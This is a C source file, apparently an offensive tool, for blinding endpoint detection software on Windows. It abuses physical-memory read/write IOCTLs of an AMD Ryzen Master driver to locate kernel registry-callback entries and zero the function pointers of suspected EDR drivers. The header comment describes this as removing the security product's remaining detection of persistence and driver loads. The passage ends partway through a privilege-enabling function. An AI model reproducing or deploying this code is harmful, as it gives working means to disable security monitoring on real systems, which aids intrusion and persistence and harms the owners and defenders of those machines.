/*
 * cm_callbacks_bypass.c â€” Clear CmRegisterCallback / CmRegisterCallbackEx entries
 *
 * EDRs use CmRegisterCallbackEx to monitor registry operations in real time:
 *
 *   HKLM\SYSTEM\CurrentControlSet\Services   â€” detect new driver/service install
 *   HKLM\...\Image File Execution Options    â€” detect IFEO persistence / injection
 *   HKLM\SOFTWARE\...\Run (and variants)     â€” detect persistence
 *   HKLM\SYSTEM\...\<own product key>        â€” tamper-protection of EDR config
 *
 * After clearing Ps* / Ob / Flt / ETW callbacks, registry callbacks remain the
 * last kernel-level detection channel the EDR has for persistence and driver load.
 *
 * â”€â”€ Structure layout â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 *
 * Each CmRegisterCallbackEx call allocates a _CM_NOTIFY_ENTRY (NonPaged pool):
 *
 *   _CM_NOTIFY_ENTRY (Win10 1903 â€“ Win11 24H2, x64):
 *     +0x000  LIST_ENTRY  ListEntry   links into ntoskrnl global callback list
 *     +0x010  UNICODE_STRING Altitude registration altitude (ordering string)
 *                Length  +0x010  USHORT   2â€“40 (must be even â€” Unicode)
 *                MaxLen  +0x012  USHORT   = Length + 2
 *                Buffer  +0x018  PWSTR    kernel VA â†’ wchar_t altitude digits
 *     +0x020  PVOID       Context     caller-supplied context
 *     +0x028  PVOID       Function    â† scan anchor; zeroed to disable
 *     +0x030  LARGE_INTEGER Cookie    unregister handle (non-zero)
 *     +0x038  PVOID       Driver      PDRIVER_OBJECT (pool VA)
 *
 * ntoskrnl checks Function != NULL before dispatching â†’ zeroing is safe.
 *
 * â”€â”€ Physical scan â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 *
 * Primary method: physical memory scan for _CM_NOTIFY_ENTRY pool objects.
 * Anchor: Function pointer at struct+0x028.
 *
 * 8 guards eliminate false positives:
 *   1. Function in known loaded driver (not ntoskrnl), RVA < 4 MB
 *   2. ListEntry.Flink / Blink are 8-aligned kernel pool VAs (not in any module)
 *   3. Altitude.Length is 2-40, must be even (Unicode)
 *   4. Altitude.MaxLength == Length + 2
 *   5. Altitude.Buffer is kernel VA
 *   6. Context is NULL or kernel VA
 *   7. Cookie is non-zero 64-bit value
 *   8. Driver is 8-aligned kernel pool VA (not in any module)
 *
 * Secondary method: LEA scan in CmUnRegisterCallback / CmRegisterCallbackEx
 * looking for the list head in ntoskrnl .data (same technique as
 * notify_callbacks_bypass). Reported for informational purposes.
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -O2 -Wall -o cm_callbacks_bypass.exe \
 *       cm_callbacks_bypass.c -lkernel32 -ladvapi32
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* â”€â”€ Driver â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
#define DEVICE_NAME      L"\\\\.\\AMDRyzenMasterDriverV20"
#define IOCTL_PHYS_READ  0x81112F08u
#define IOCTL_PHYS_WRITE 0x81112F0Cu
static HANDLE g_dev = INVALID_HANDLE_VALUE;

/* â”€â”€ Physical ranges â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
#define MAX_RANGES 64
typedef struct { uint64_t base, size; } PhysRange;
static PhysRange g_ranges[MAX_RANGES];
static int       g_nranges = 0;

static void load_ranges(void)
{
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory",
            0, KEY_READ, &hKey) != ERROR_SUCCESS) return;
    char vname[256]; DWORD vn, vd, type;
    uint8_t *buf = NULL; DWORD sz = 0;
    for (DWORD i = 0; ; i++) {
        vn = sizeof vname; vd = 0;
        if (RegEnumValueA(hKey,i,vname,&vn,NULL,&type,NULL,&vd) == ERROR_NO_MORE_ITEMS) break;
        if ((type!=3&&type!=8)||vd<20) continue;
        buf = (uint8_t*)malloc(vd);
        if (!buf) continue;
        if (RegQueryValueExA(hKey,vname,NULL,NULL,buf,&vd)==ERROR_SUCCESS){sz=vd;break;}
        free(buf); buf=NULL;
    }
    RegCloseKey(hKey);
    if (!buf||sz<20){free(buf);return;}
    DWORD cnt=*(DWORD*)(buf+16); uint8_t *p=buf+20;
    for (DWORD i=0;i<cnt&&g_nranges<MAX_RANGES;i++,p+=20){
        if(p+20>buf+sz||p[0]!=3) continue;
        g_ranges[g_nranges].base=*(uint64_t*)(p+4);
        g_ranges[g_nranges].size=*(uint64_t*)(p+12);
        g_nranges++;
    }
    free(buf);
}

static int pa_in_range(uint64_t pa, uint32_t sz)
{
    for(int i=0;i<g_nranges;i++)
        if(pa>=g_ranges[i].base&&pa+sz<=g_ranges[i].base+g_ranges[i].size) return 1;
    return 0;
}

/* â”€â”€ Physical I/O â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
static int phys_read(uint64_t pa, void *buf, uint32_t sz)
{
    uint8_t in_buf[12];
    *(uint64_t*)in_buf=pa; *(uint32_t*)(in_buf+8)=sz;
    uint32_t out_sz=12+sz;
    uint8_t *out=(uint8_t*)calloc(1,out_sz); if(!out) return 0;
    DWORD got=0;
    BOOL ok=DeviceIoControl(g_dev,IOCTL_PHYS_READ,in_buf,12,out,out_sz,&got,NULL);
    if(ok&&got>=12) memcpy(buf,out+12,sz);
    free(out); return ok&&got>=12;
}

static int phys_write(uint64_t pa, const void *data, uint32_t sz)
{
    if(!pa_in_range(pa,sz)) return 0;
    uint32_t in_sz=12+sz;
    uint8_t *in_buf=(uint8_t*)malloc(in_sz); if(!in_buf) return 0;
    *(uint64_t*)in_buf=pa; *(uint32_t*)(in_buf+8)=sz;
    memcpy(in_buf+12,data,sz);
    DWORD got=0;
    BOOL ok=DeviceIoControl(g_dev,IOCTL_PHYS_WRITE,in_buf,in_sz,NULL,0,&got,NULL);
    free(in_buf); return ok;
}

/* â”€â”€ Module list â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
typedef NTSTATUS (NTAPI *PFN_NTQSI)(ULONG,PVOID,ULONG,PULONG);
typedef struct {
    HANDLE Section; PVOID MappedBase,ImageBase;
    ULONG  ImageSize,Flags;
    USHORT LoadOrderIndex,InitOrderIndex,LoadCount,OffsetToFileName;
    CHAR   FullPathName[256];
} MOD_ENTRY;
typedef struct { ULONG NumberOfModules; MOD_ENTRY Modules[1]; } MOD_LIST;

static MOD_LIST *get_module_list(void)
{
    PFN_NTQSI fn=(PFN_NTQSI)GetProcAddress(GetModuleHandleA("ntdll.dll"),"NtQuerySystemInformation");
    if(!fn) return NULL;
    ULONG sz=0x80000; MOD_LIST *ml=NULL; NTSTATUS st;
    do{free(ml);ml=(MOD_LIST*)malloc(sz*=2);st=fn(11,ml,sz,NULL);}
    while(st==(NTSTATUS)0xC0000004L);
    if(st){free(ml);return NULL;} return ml;
}

/* â”€â”€ Kernel module map â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
#define MAX_MODS 256
typedef struct { uint64_t base,size; char name[64]; } KMod;
static KMod g_mods[MAX_MODS];
static int  g_nmods=0;

static void load_module_map(void)
{
    MOD_LIST *ml=get_module_list(); if(!ml) return;
    for(ULONG i=0;i<ml->NumberOfModules&&g_nmods<MAX_MODS;i++){
        g_mods[g_nmods].base=(uint64_t)ml->Modules[i].ImageBase;
        g_mods[g_nmods].size=ml->Modules[i].ImageSize;
        const char *fn=ml->Modules[i].FullPathName+ml->Modules[i].OffsetToFileName;
        strncpy(g_mods[g_nmods].name,fn,63); g_mods[g_nmods].name[63]='\0';
        g_nmods++;
    }
    free(ml);
}

static const char *va_to_driver(uint64_t va)
{
    for(int i=1;i<g_nmods;i++)
        if(va>=g_mods[i].base&&va<g_mods[i].base+g_mods[i].size)
            return g_mods[i].name;
    return NULL;
}

static const char *va_to_driver_ex(uint64_t va, uint64_t *rva_out)
{
    for(int i=1;i<g_nmods;i++)
        if(va>=g_mods[i].base&&va<g_mods[i].base+g_mods[i].size){
            if(rva_out) *rva_out=va-g_mods[i].base;
            return g_mods[i].name;
        }
    return NULL;
}

static int va_in_any_module(uint64_t va)
{
    for(int i=0;i<g_nmods;i++)
        if(va>=g_mods[i].base&&va<g_mods[i].base+g_mods[i].size) return 1;
    return 0;
}

/* â”€â”€ Driver classification â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
typedef enum { DRV_SYSTEM, DRV_NETWORK, DRV_VM, DRV_OTHER } DrvClass;

static DrvClass classify_driver(const char *name)
{
    static const char *sys_list[] = {
        "Ntfs.sys","FLTMGR.SYS","fileinfo.sys","Wof.sys","refs.sys",
        "FastFat.sys","exfat.sys","cdfs.sys","udfs.sys","rdbss.sys","luafv.sys",
        "volmgrx.sys","volmgr.sys","disk.sys","storport.sys","classpnp.sys",
        "CLFS.SYS","fvevol.sys","iorate.sys","win32kfull.sys","win32kbase.sys",
        "ksecdd.sys","cng.sys","werkernel.sys","pcw.sys","DxgKrnl.sys",NULL
    };
    static const char *net_list[] = {
        "tcpip.sys","HTTP.sys","msquic.sys","tdx.sys","afd.sys",
        "netbt.sys","ndis.sys","netio.sys","pacer.sys",NULL
    };
    static const char *vm_list[] = {
        "vmhgfs.sys","vmmemctl.sys","vmxnet3nd.sys","vmci.sys",
        "vmbus.sys","hvsocket.sys","hvnetvsc.sys","VBoxGuest.sys",NULL
    };
    for(int i=0;sys_list[i];i++) if(_stricmp(name,sys_list[i])==0) return DRV_SYSTEM;
    for(int i=0;net_list[i];i++) if(_stricmp(name,net_list[i])==0) return DRV_NETWORK;
    for(int i=0;vm_list[i];i++)  if(_stricmp(name,vm_list[i])==0)  return DRV_VM;
    return DRV_OTHER;
}

static const char *drv_class_label(DrvClass c)
{
    switch(c){
        case DRV_SYSTEM:  return "[SYS  !!DO-NOT-ZERO!!]";
        case DRV_NETWORK: return "[NET  skip]";
        case DRV_VM:      return "[VM   skip]";
        default:          return "[EDR? target]";
    }
}

/* â”€â”€ PE export RVA lookup â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
static uint32_t pe_export_rva(const uint8_t *pe, size_t fsz, const char *sym)
{
    if(fsz<0x100||pe[0]!='M'||pe[1]!='Z') return 0;
    int32_t elf=*(int32_t*)(pe+0x3C);
    if(elf<=0||(uint32_t)elf+0x90>fsz) return 0;
    uint16_t ns=*(uint16_t*)(pe+elf+6),osz=*(uint16_t*)(pe+elf+20);
    uint32_t sb=(uint32_t)elf+24+osz;
    #define R2F(rva,fo) do{(fo)=0;\
        for(uint16_t _i=0;_i<ns;_i++){\
            uint32_t _s=sb+_i*40,_va=*(uint32_t*)(pe+_s+12);\
            uint32_t _vsz=*(uint32_t*)(pe+_s+16);if(!_vsz)_vsz=*(uint32_t*)(pe+_s+24);\
            uint32_t _fo=*(uint32_t*)(pe+_s+20);\
            if((rva)>=_va&&(rva)<_va+_vsz){(fo)=_fo+((rva)-_va);break;}}\
    }while(0)
    uint32_t erva=*(uint32_t*)(pe+elf+0x88),efo=0; R2F(erva,efo);
    if(!efo||efo+40>fsz) return 0;
    const uint8_t *exp=pe+efo;
    uint32_t nn=*(uint32_t*)(exp+0x18);
    uint32_t rfn=*(uint32_t*)(exp+0x1C),rnm=*(uint32_t*)(exp+0x20),rod=*(uint32_t*)(exp+0x24);
    uint32_t ffn=0,fnm=0,fod=0; R2F(rfn,ffn); R2F(rnm,fnm); R2F(rod,fod);
    if(!ffn||!fnm||!fod) return 0;
    for(uint32_t i=0;i<nn;i++){
        uint32_t nrva=*(uint32_t*)(pe+fnm+i*4),nfo=0; R2F(nrva,nfo);
        if(!nfo||nfo>=fsz) continue;
        if(strcmp((char*)(pe+nfo),sym)==0){
            uint16_t ord=*(uint16_t*)(pe+fod+i*2);
            return *(uint32_t*)(pe+ffn+ord*4);
        }
    }
    #undef R2F
    return 0;
}

/* â”€â”€ PE: check if RVA is in a writable data section â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
static int rva_in_data_section(const uint8_t *pe, size_t pe_sz, uint32_t rva)
{
    if(pe_sz<0x40||pe[0]!='M'||pe[1]!='Z') return 0;
    uint32_t pe_off=*(uint32_t*)(pe+0x3C);
    if(pe_off+24>pe_sz) return 0;
    uint16_t n_sec=*(uint16_t*)(pe+pe_off+6);
    uint16_t opt_sz=*(uint16_t*)(pe+pe_off+20);
    uint32_t stab=pe_off+24+opt_sz;
    for(int i=0;i<n_sec;i++){
        uint32_t s=stab+i*40; if(s+40>pe_sz) break;
        uint32_t va=*(uint32_t*)(pe+s+12),vsz=*(uint32_t*)(pe+s+16);
        uint32_t chr=*(uint32_t*)(pe+s+36);
        if(rva<va||rva>=va+vsz) continue;
        int is_code=(chr&0x20)||(chr&0x20000000U);
        int is_wdata=(chr&0x40)&&(chr&0x80000000U);
        return is_wdata&&!is_code;
    }
    return 0;
}

/* â”€â”€ Find ntoskrnl PA via 2MB NtBuildNumber scan â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
#define CHUNK_SIZE 0x10000
static uint8_t g_chunk[CHUNK_SIZE];

static uint64_t find_ntoskrnl_pa(const char *path)
{
    HANDLE hf=CreateFileA(path,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
    if(hf==INVALID_HANDLE_VALUE) return 0;
    DWORD fsz=GetFileSize(hf,NULL);
    uint8_t *pe=(uint8_t*)malloc(fsz); DWORD rd=0;
    ReadFile(hf,pe,fsz,&rd,NULL); CloseHandle(hf);
    uint32_t rva=pe_export_rva(pe,fsz,"NtBuildNumber");
    free(pe); if(!rva) return 0;
    uint32_t ssd=*(uint32_t*)(0x7FFE0000+0x260)&0xFFFF;
    uint32_t c0=ssd,c1=ssd|0xF0000000,c2=ssd|0xC0000000;
    const uint64_t STEP=0x200000ULL;
    for(int ri=0;ri<g_nranges;ri++){
        uint64_t base=(g_ranges[ri].base+STEP-1)&~(STEP-1);
        uint64_t end=g_ranges[ri].base+g_ranges[ri].size;
        for(uint64_t pa=base;pa<end;pa+=STEP){
            if(!pa_in_range(pa+rva,4)) continue;
            uint32_t val=0; phys_read(pa+rva,&val,4);
            if(val!=c0&&val!=c1&&val!=c2) continue;
            uint16_t mz=0; phys_read(pa,&mz,2);
            if(mz==0x5A4D) return pa;
        }
    }
    return 0;
}

/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 * Secondary method â€” LEA scan to find callback list head in ntoskrnl .data
 *
 * Scans the first 512 bytes of CmUnRegisterCallback and CmRegisterCallbackEx
 * for RIP-relative LEA â†’ writable data section targets.  Reported informally;
 * primary detection is the physical pool scan below.
 * â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */
static void report_list_head(const uint8_t *pe, size_t pe_sz,
                              uint64_t nt_pa, uint64_t nt_va,
                              const char *func_name)
{
    uint32_t func_rva = pe_export_rva(pe, pe_sz, func_name);
    if (!func_rva) { printf("    %s: not exported\n", func_name); return; }

    uint8_t code[512] = {0};
    phys_read(nt_pa + func_rva, code, sizeof code);

    printf("    %s  RVA=0x%X  LEA targets â†’ data:\n", func_name, func_rva);
    int found = 0;
    for (int i = 0; i < (int)sizeof(code) - 7; i++) {
        if ((code[i] != 0x48 && code[i] != 0x4C)) continue;
        if (code[i+1] != 0x8D) continue;
        if ((code[i+2] & 0xC7) != 0x05) continue;
        int32_t disp = *(int32_t*)(code + i + 3);
        uint64_t tgt_va  = (uint64_t)((int64_t)(nt_va + func_rva + i + 7) + disp);
        if (tgt_va < nt_va || tgt_va >= nt_va + pe_sz) continue;
        if (!rva_in_data_section(pe, pe_sz, (uint32_t)(tgt_va - nt_va))) continue;
        printf("      +0x%03X  LEA â†’ 0x%016llX  (ntoskrnl+0x%X)\n",
               i, (unsigned long long)tgt_va, (uint32_t)(tgt_va - nt_va));
        found++;
    }
    if (!found) printf("      (none found in first 512 bytes)\n");
}

/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 * CM callback entry scan structures
 * â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */
#define MAX_SANE_RVA  0x400000ULL
#define MAX_CM_ENTRIES 256

typedef struct {
    uint64_t struct_pa;     /* PA of _CM_NOTIFY_ENTRY start */
    uint64_t func_pa;       /* PA of Function pointer field (struct+0x28) */
    uint64_t func_va;       /* original Function value */
    uint64_t cookie;        /* Cookie LARGE_INTEGER */
    uint64_t driver_va;     /* Driver field value */
    uint8_t  anchor;        /* function offset within struct (0x28 or 0x20) */
    char     driver[64];    /* name of driver owning callback function */
    uint8_t  orig_func[8];  /* saved original for restore */
    int      zeroed;
} CmEntry;

static CmEntry g_cm[MAX_CM_ENTRIES];
static int     g_n_cm = 0;

/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 * Physical scan for _CM_NOTIFY_ENTRY
 *
 * Anchor: Function pointer at struct+anchor (try 0x28, 0x20).
 *
 * Offsets relative to anchor (off = Function position in chunk):
 *   Anchor 0x28:
 *     off-0x28: Flink        off-0x20: Blink
 *     off-0x18: Alt.Length(USHORT) | Alt.MaxLen(USHORT)
 *     off-0x10: Alt.Buffer   off-0x08: Context
 *     off+0x00: Function     off+0x08: Cookie (LARGE_INTEGER)
 *     off+0x10: Driver (PVOID)
 *   Anchor 0x20:
 *     off-0x20: Flink        off-0x18: Blink
 *     off-0x10: Alt.Length | Alt.MaxLen
 *     off-0x08: Alt.Buffer
 *     off+0x00: Function     off+0x08: Cookie
 *     off+0x10: Driver
 * â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */
static int try_cm_entry(uint64_t cpa, uint64_t off, uint64_t csz, uint8_t anchor)
{
    if (off < (uint64_t)anchor || off + 0x18 > csz) return 0;

    uint64_t func = *(uint64_t*)(g_chunk + off);

    /* Guard 1: Function in known driver, RVA sane */
    uint64_t func_rva = 0;
    const char *drv = va_to_driver_ex(func, &func_rva);
    if (!drv) return 0;
    if (func_rva == 0 || func_rva >= MAX_SANE_RVA) return 0;

    /* Guard 2: Flink / Blink are 8-aligned kernel pool VAs, not in any module */
    uint64_t flink = *(uint64_t*)(g_chunk + off - (uint64_t)anchor + 0x00);
    uint64_t blink = *(uint64_t*)(g_chunk + off - (uint64_t)anchor + 0x08);
    if ((flink >> 48) != 0xFFFFULL) return 0;
    if ((blink >> 48) != 0xFFFFULL) return 0;
    if (flink & 7) return 0;
    if (blink & 7) return 0;
    if (va_in_any_module(flink)) return 0;
    if (va_in_any_module(blink)) return 0;

    /* Guard 3+4: Altitude.Length and MaxLength (16-bit, Unicode digit string)
     * Altitude is a decimal number like "320000", "385200", "328010" etc.
     * Unicode string: Length = 2 * num_digits, MaxLength = Length + 2 */
    uint16_t alt_len    = *(uint16_t*)(g_chunk + off - (uint64_t)anchor + 0x10);
    uint16_t alt_maxlen = *(uint16_t*)(g_chunk + off - (uint64_t)anchor + 0x12);
    if (alt_len < 2 || alt_len > 40) return 0;
    if (alt_len & 1) return 0;                          /* must be even (Unicode) */
    if (alt_maxlen != alt_len + 2) return 0;

    /* Guard 5: Altitude.Buffer is kernel VA */
    uint64_t alt_buf = *(uint64_t*)(g_chunk + off - (uint64_t)anchor + 0x18);
    if ((alt_buf >> 48) != 0xFFFFULL) return 0;

    /* Guard 6: Context (at off-0x08 for anchor=0x28) is NULL or kernel VA */
    if (anchor == 0x28) {
        uint64_t ctx = *(uint64_t*)(g_chunk + off - 0x08);
        if (ctx && (ctx >> 48) != 0xFFFFULL) return 0;
    }

    /* Guard 7: Cookie (LARGE_INTEGER at off+0x08) is non-zero */
    uint64_t cookie = *(uint64_t*)(g_chunk + off + 0x08);
    if (cookie == 0) return 0;

    /* Guard 8: Driver (PVOID at off+0x10) is 8-aligned kernel pool VA */
    uint64_t drv_ptr = *(uint64_t*)(g_chunk + off + 0x10);
    if ((drv_ptr >> 48) != 0xFFFFULL) return 0;
    if (drv_ptr & 7) return 0;
    if (va_in_any_module(drv_ptr)) return 0;

    /* Dedup */
    uint64_t func_pa = cpa + off;
    for (int i = 0; i < g_n_cm; i++)
        if (g_cm[i].func_pa == func_pa) return 0;
    if (g_n_cm >= MAX_CM_ENTRIES) return 0;

    CmEntry *e = &g_cm[g_n_cm++];
    e->struct_pa = cpa + off - (uint64_t)anchor;
    e->func_pa   = func_pa;
    e->func_va   = func;
    e->cookie    = cookie;
    e->driver_va = drv_ptr;
    e->anchor    = anchor;
    strncpy(e->driver, drv, 63); e->driver[63] = '\0';
    e->zeroed = 0;
    return 1;
}

static void scan_physical(void)
{
    g_n_cm = 0;
    uint64_t last_prog = 0;
    const uint8_t anchors[] = {0x28, 0x20};

    for (int ri = 0; ri < g_nranges; ri++) {
        uint64_t rend = g_ranges[ri].base + g_ranges[ri].size;
        for (uint64_t cpa = g_ranges[ri].base; cpa < rend; cpa += CHUNK_SIZE) {
            if (g_n_cm >= MAX_CM_ENTRIES) goto done;
            if (cpa - last_prog >= 0x80000000ULL) {
                printf("  [%5llu MB] found=%d\r",
                       (unsigned long long)(cpa >> 20), g_n_cm);
                fflush(stdout);
                last_prog = cpa;
            }
            uint64_t csz = rend - cpa;
            if (csz > CHUNK_SIZE) csz = CHUNK_SIZE;
            if (!phys_read(cpa, g_chunk, (uint32_t)csz)) continue;

            for (uint64_t off = 0x28; off + 0x18 <= csz && g_n_cm < MAX_CM_ENTRIES; off += 8)
                for (int ai = 0; ai < 2; ai++)
                    if (try_cm_entry(cpa, off, csz, anchors[ai])) break;
        }
    }
done:;
}

/* â”€â”€ Grouping â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
#define MAX_GROUPS 64
typedef struct {
    char     driver[64];
    DrvClass cls;
    int      indices[MAX_CM_ENTRIES];
    int      n;
    int      selected;
} CmGroup;

static CmGroup g_groups[MAX_GROUPS];
static int     g_n_groups = 0;

static void build_groups(void)
{
    g_n_groups = 0;
    for (int i = 0; i < g_n_cm; i++) {
        int found = 0;
        for (int g = 0; g < g_n_groups; g++) {
            if (_stricmp(g_groups[g].driver, g_cm[i].driver) == 0) {
                if (g_groups[g].n < MAX_CM_ENTRIES)
                    g_groups[g].indices[g_groups[g].n++] = i;
                found = 1; break;
            }
        }
        if (!found && g_n_groups < MAX_GROUPS) {
            CmGroup *grp = &g_groups[g_n_groups++];
            strncpy(grp->driver, g_cm[i].driver, 63); grp->driver[63] = '\0';
            grp->cls = classify_driver(grp->driver);
            grp->n = 1; grp->selected = 0; grp->indices[0] = i;
        }
    }
}

/* â”€â”€ Cache eviction â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
#define EVICT_SIZE (256*1024*1024)
static void cache_evict_once(void)
{
    volatile uint8_t *p=(volatile uint8_t*)
        VirtualAlloc(NULL,EVICT_SIZE,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
    if(!p){Sleep(100);return;}
    for(size_t i=0;i<EVICT_SIZE;i+=64) p[i]=(uint8_t)(i>>6);
    volatile uint64_t s=0;
    for(size_t i=EVICT_SIZE;i>=64;i-=64) s^=p[i-64];
    (void)s;
    VirtualFree((LPVOID)p,0,MEM_RELEASE); Sleep(10);
}
static void cache_evict_multiccd(void)
{
    SYSTEM_INFO si; GetSystemInfo(&si); DWORD ncpu=si.dwNumberOfProcessors;
    HANDLE thr=GetCurrentThread();
    DWORD_PTR orig=SetThreadAffinityMask(thr,1);
    SetThreadAffinityMask(thr,1ULL); Sleep(1); cache_evict_once();
    if(ncpu>1){SetThreadAffinityMask(thr,(DWORD_PTR)1<<(ncpu-1));Sleep(1);cache_evict_once();}
    SetThreadAffinityMask(thr,orig);
}

static volatile int g_any_zeroed = 0;

static void disable_group(CmGroup *grp)
{
    int ok = 0, fail = 0;
    uint64_t z8 = 0;
    for (int k = 0; k < grp->n; k++) {
        CmEntry *e = &g_cm[grp->indices[k]];
        if (!phys_read(e->func_pa, e->orig_func, 8)) { fail++; continue; }
        if (phys_write(e->func_pa, &z8, 8)) {
            e->zeroed = 1; ok++;
        } else {
            fail++;
            printf("    [!] write failed PA=0x%016llX\n",(unsigned long long)e->func_pa);
        }
    }
    printf("    Disabled: %d  Failed: %d\n", ok, fail);
    if (ok > 0) g_any_zeroed = 1;
}

static void restore_group(CmGroup *grp)
{
    for (int k = 0; k < grp->n; k++) {
        CmEntry *e = &g_cm[grp->indices[k]];
        if (!e->zeroed) continue;
        uint64_t cur = 0;
        if (phys_read(e->func_pa, &cur, 8) && cur == 0)
            phys_write(e->func_pa, e->orig_func, 8);
        e->zeroed = 0;
    }
}

static void do_restore_all(void)
{
    if (!g_any_zeroed) return;
    printf("\n[R] Restoring CmRegisterCallback entries...\n");
    for (int g = 0; g < g_n_groups; g++)
        if (g_groups[g].selected) restore_group(&g_groups[g]);
    g_any_zeroed = 0;
    printf("[R] Done.\n\n");
}

static BOOL WINAPI ctrl_handler(DWORD ev)
{
    if(ev==CTRL_C_EVENT||ev==CTRL_BREAK_EVENT||
       ev==CTRL_CLOSE_EVENT||ev==CTRL_LOGOFF_EVENT||ev==CTRL_SHUTDOWN_EVENT){
        if(g_any_zeroed){
            printf("\n[!] %s â€” emergency restore...\n",ev==CTRL_C_EVENT?"Ctrl+C":"shutdown");
            fflush(stdout); do_restore_all(); cache_evict_multiccd(); fflush(stdout);
        }
        return FALSE;
    }
    return FALSE;
}

static void enable_debug_privilege(void)
{
    HANDLE hTok; TOKEN_PRIVILEGES tp={1};
    if(!OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&hTok)) return;
